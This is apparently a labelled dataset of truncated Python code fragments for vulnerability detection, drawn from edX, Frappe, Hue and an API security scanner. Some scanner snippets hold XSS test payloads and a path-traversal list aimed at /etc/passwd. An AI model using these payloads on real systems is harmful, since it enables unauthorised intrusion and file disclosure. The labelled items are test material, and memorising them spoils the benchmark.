urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT", "label": 0}, {"snippet_id": 8854, "code": "(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template", "label": 0}, {"snippet_id": 39917, "code": "(): \t\t\tif df.fieldname==\"naming_series\" or not(self.get(df.fieldname) and df.options): \t\t\t\tcontinue \t\t\toptions=(df.options or \"\").split(\"\\n\") \t\t\t \t\t\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself", "label": 0}, {"snippet_id": 40610, "code": "\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef", "label": 0}, {"snippet_id": 22056, "code": ") if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r", "label": 0}, {"snippet_id": 15535, "code": "-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"-", "label": 0}, {"snippet_id": 37274, "code": ".content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today(", "label": 0}, {"snippet_id": 46151, "code": ") def index_m(request): return index(request, True) def new_search(request): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections: return no_collections", "label": 0}, {"snippet_id": 51189, "code": ".StackedInline): model=DashboardUser can_delete=False verbose_name_plural='Dashboard Users' class UserResource(resources.ModelResource): class Meta: model=User class GroupResource(resources.ModelResource): class", "label": 0}, {"snippet_id": 34356, "code": " key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t", "label": 0}, {"snippet_id": 51024, "code": " Crontab. Crontab would be half-great if the parameters where named. Get your crontab guru going, this is the only way you'll understand what you're doing. https://crontab.guru/ \"\"\" def clean(self): print(", "label": 0}, {"snippet_id": 18265, "code": "/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index',", "label": 1}, {"snippet_id": 20440, "code": " self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self.course_key, \"depth\": \"all\", \"all_blocks", "label": 0}, {"snippet_id": 32640, "code": "): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code', 'markdown.extensions.tables', 'markdown.extensions.toc', 'gitiles_autolink', 'gitiles_ext_blocks', 'gitiles_smart_quotes", "label": 0}, {"snippet_id": 4201, "code": " vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, ", "label": 0}, {"snippet_id": 953, "code": "+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G,", "label": 1}, {"snippet_id": 39503, "code": "\t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' \t\tself.set(\"modified\", now()) \t\tfrappe.db.set_value(self.doctype, self.name", "label": 0}, {"snippet_id": 11290, "code": ") self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz", "label": 0}, {"snippet_id": 53282, "code": "'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run", "label": 0}, {"snippet_id": 39222, "code": " \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif", "label": 0}, {"snippet_id": 31270, "code": " pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp", "label": 0}, {"snippet_id": 40689, "code": " \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn", "label": 0}, {"snippet_id": 31593, "code": "=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\", \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t", "label": 0}, {"snippet_id": 44207, "code": ".rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import", "label": 0}, {"snippet_id": 25467, "code": " self.scheme['fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs )", "label": 0}, {"snippet_id": 17520, "code": "=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW", "label": 0}, {"snippet_id": 42112, "code": "\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1)", "label": 0}, {"snippet_id": 30198, "code": " systemctl %s waf\" % action] \tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers", "label": 0}, {"snippet_id": 38222, "code": ".db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{", "label": 0}, {"snippet_id": 12014, "code": ".modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/", "label": 0}, {"snippet_id": 35176, "code": " self.name, 'modified', self.modified, update_modified=False) \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df", "label": 0}, {"snippet_id": 34670, "code": " \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int", "label": 0}, {"snippet_id": 54340, "code": " global crawl crawl=ttk.Combobox(main, values=[\"On\", \"Off\"]) target.grid(row=0, column=1) target.config(width=30) cookie.grid(row=1, column=1) cookie.config(width=30) method.grid(row=2, column=1) method", "label": 0}, {"snippet_id": 9191, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 37117, "code": "\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" ", "label": 0}, {"snippet_id": 34678, "code": " int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname]=cint(d[fieldname]) \t\t\t\telif df.fieldtype", "label": 0}, {"snippet_id": 1478, "code": " flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard", "label": 1}, {"snippet_id": 28499, "code": "-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive", "label": 0}, {"snippet_id": 830, "code": " as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list", "label": 0}, {"snippet_id": 11203, "code": "/ self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE", "label": 0}, {"snippet_id": 49290, "code": "(\"Cannot use underscore(_) variables/functions in smart lists\") try: self.model_field=self.model._meta.get_field(self.field_name) self.order_field=self.field_name except FieldDoesNotExist: self.model_field", "label": 0}, {"snippet_id": 37682, "code": "\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name", "label": 0}, {"snippet_id": 31079, "code": "%s\" % script) \tsql.update_server_master(master, slave) \t if form.getvalue('masteradd'): \tmaster=form.getvalue('masteradd') \tslave=form.getvalue('slaveadd') \tinterface=form.getvalue('interfaceadd') \tvrrpip", "label": 0}, {"snippet_id": 49702, "code": "=field else: if callable(field): kwargs['field'], kwargs['render_function'], kwargs['label']=None, field, label else: kwargs['field'], kwargs['label']=field, label columns.append(SmartColumn(**kwargs))", "label": 0}, {"snippet_id": 12966, "code": " settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +", "label": 0}, {"snippet_id": 3334, "code": " print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer", "label": 0}, {"snippet_id": 19731, "code": " ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a", "label": 0}, {"snippet_id": 37610, "code": "(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None", "label": 0}, {"snippet_id": 6590, "code": " res=[] for this in value.split(','): this=this.strip() name, _sep, path,=this.partition(':') res.append((name, path)) self._parsed_content_packages=res return res @property def verify_request_signatures", "label": 0}, {"snippet_id": 493, "code": "\"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid", "label": 0}, {"snippet_id": 43759, "code": "\t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and", "label": 0}, {"snippet_id": 12722, "code": ".MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete", "label": 0}, {"snippet_id": 3392, "code": "=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'", "label": 0}, {"snippet_id": 12629, "code": "'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 23718, "code": "{repo_dir}/test_root/log{shard_str}' \" \"VERIFY_XSS='{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml ", "label": 0}, {"snippet_id": 27862, "code": " exception in handle_exception and format it properly.\"\"\" exception=sys.exc_info()[1] values={'message': exception.message, 'traceDump': traceback.format_exc()} logging.exception(exception) if helpers.should_render_json", "label": 0}, {"snippet_id": 22788, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^", "label": 1}, {"snippet_id": 750, "code": " xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G,", "label": 0}, {"snippet_id": 42043, "code": "(key) \t\t\tvalue=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue", "label": 0}, {"snippet_id": 2603, "code": "): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload}", "label": 0}, {"snippet_id": 32733, "code": " full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read().replace( '&', '&amp;').replace( '<', '", "label": 0}, {"snippet_id": 44601, "code": "] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout", "label": 0}, {"snippet_id": 1784, "code": " import urllib from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[]", "label": 0}, {"snippet_id": 16135, "code": ".user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user", "label": 0}, {"snippet_id": 28106, "code": " sql from jinja2 import Environment, FileSystemLoader env=Environment(loader=FileSystemLoader('templates/')) template=env.get_template('config.html') print('Content-type: text/html\\n') funct.check_login(", "label": 1}, {"snippet_id": 37508, "code": "\"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local", "label": 1}, {"snippet_id": 27350, "code": " from libs import form from libs import helpers from system import environment def add_jinja2_filter(name, fn): _JINJA_ENVIRONMENT.filters[name]=fn class JsonEncoder(json.JSONEncoder): \"\"\"Json encoder.\"\"", "label": 0}, {"snippet_id": 48263, "code": " rid): res: GroupReservation=GroupReservation.objects.get(id=rid) def add_article_action(request: HttpRequest, default_foreward_url: str): forward_url: str=default_foreward_url if request.GET.get(\"redirect", "label": 0}, {"snippet_id": 41764, "code": " update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get", "label": 0}, {"snippet_id": 37378, "code": "\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_", "label": 0}, {"snippet_id": 43462, "code": "\t\t'''Save password field values in __Auth table''' \t\tif self.flags.ignore_save_passwords is True: \t\t\treturn \t\tfor df in self.meta.get('fields',{'fieldtype':('=', 'Password')}): \t\t\tif self.flags.ignore_save_passwords", "label": 0}, {"snippet_id": 32420, "code": " \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about the conversion is at: https://gerrit.googlesource", "label": 0}, {"snippet_id": 585, "code": "?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url", "label": 0}, {"snippet_id": 18575, "code": ", name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 8614, "code": " url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib", "label": 0}, {"snippet_id": 10843, "code": ".report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql.", "label": 0}, {"snippet_id": 53455, "code": "=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in", "label": 0}, {"snippet_id": 28146, "code": "\tservers=sql.get_dick_permit() \ttoken=sql.get_token(user_id.value) \trole=sql.get_user_role_by_uuid(user_id.value) except: \tpass hap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir", "label": 0}, {"snippet_id": 1153, "code": ",render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient", "label": 1}, {"snippet_id": 21301, "code": "/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook", "label": 1}, {"snippet_id": 19472, "code": ".shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string", "label": 0}, {"snippet_id": 52200, "code": ".get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2.delete() response={} request.info(_('Workflows", "label": 0}, {"snippet_id": 15637, "code": "\"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self", "label": 0}, {"snippet_id": 16954, "code": " name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 48428, "code": ".SRID=SubReservation.objects.get(id=int(request.GET[\"srid\"])) ar.notes=str(request.POST[str(\"notes_\" +str(art.id))]) ar.save() if \"srid\" in request.GET: response=HttpResponseRedirect(forward_url +\"?rid=", "label": 1}, {"snippet_id": 8205, "code": "'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 14215, "code": "+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/',", "label": 0}, {"snippet_id": 23942, "code": "._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=", "label": 0}, {"snippet_id": 8891, "code": "'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern", "label": 0}, {"snippet_id": 45710, "code": "/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request", "label": 0}, {"snippet_id": 11091, "code": "}\" \"./manage.py cms --settings=bok_choy import{import_dir}\".format( default_store=self.default_store, import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures ", "label": 0}, {"snippet_id": 32976, "code": " relpath, relative_to=None): if relative_to is None: relative_to=self.server.top_level assert not relpath.startswith(os.sep) path=os.path.join(relative_to, relpath) with codecs.open(path, encoding='utf-8'", "label": 0}, {"snippet_id": 20315, "code": " else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format", "label": 0}, {"snippet_id": 27375, "code": " if isinstance(obj, ndb.Model): dict_obj=obj.to_dict() dict_obj['id']=obj.key.id() return dict_obj elif isinstance(obj, datetime.datetime): return int((obj -self._EPOCH).total_seconds()) elif hasattr(obj", "label": 0}, {"snippet_id": 37437, "code": " \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\",", "label": 0}, {"snippet_id": 1693, "code": "': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact']", "label": 0}, {"snippet_id": 38532, "code": "\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t", "label": 0}, {"snippet_id": 48102, "code": " height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /=diameter width *=IMAGE_SCALE height *=IMAGE_SCALE cropped=original.resize((int(width), int(height))", "label": 0}, {"snippet_id": 3746, "code": "=urllib.unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param", "label": 0}, {"snippet_id": 4894, "code": " _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<-", "label": 0}, {"snippet_id": 48955, "code": "%s_display' % self.column.field_name, False) value=display_function() if display_function else field return escape(value) def format(self, value): if isinstance(value, datetime.datetime) or isinstance(value", "label": 1}, {"snippet_id": 10575, "code": ".test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib", "label": 0}, {"snippet_id": 22781, "code": "'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 819, "code": "!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid", "label": 1}, {"snippet_id": 43331, "code": "\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t", "label": 0}, {"snippet_id": 41654, "code": "\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname)", "label": 0}, {"snippet_id": 7144, "code": " not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id", "label": 0}, {"snippet_id": 50969, "code": " ImportExportModelAdmin from dashboard.internet_nl_dashboard.models import Account, DashboardUser, UploadLog, UrlList class MyPeriodicTaskForm(PeriodicTaskForm): fieldsets=PeriodicTaskAdmin.fieldsets \"\"", "label": 0}, {"snippet_id": 36440, "code": ", ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype", "label": 0}, {"snippet_id": 1804, "code": "-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers", "label": 0}, {"snippet_id": 3136, "code": "'' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request", "label": 0}, {"snippet_id": 26320, "code": " Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if", "label": 0}, {"snippet_id": 19353, "code": " def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 1}, {"snippet_id": 23244, "code": ", name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if", "label": 0}, {"snippet_id": 26527, "code": "%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00',", "label": 0}, {"snippet_id": 14367, "code": "-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url", "label": 0}, {"snippet_id": 34397, "code": " \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t", "label": 0}, {"snippet_id": 1874, "code": "=None): print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload", "label": 0}, {"snippet_id": 48004, "code": "\"media_id\"]) user: Profile=Profile.objects.get(pk=int(user_id)) u: Profile=get_current_user(request) if not(u==user) and u.rights < 4: return redirect(\"/admin?error='You're not allowed to edit other users.", "label": 0}, {"snippet_id": 25517, "code": ".require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages['incomplete'], code='required') return value class BaseQuestionsForm(forms.Form): \"\"\" This form class is", "label": 0}, {"snippet_id": 23090, "code": "]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), 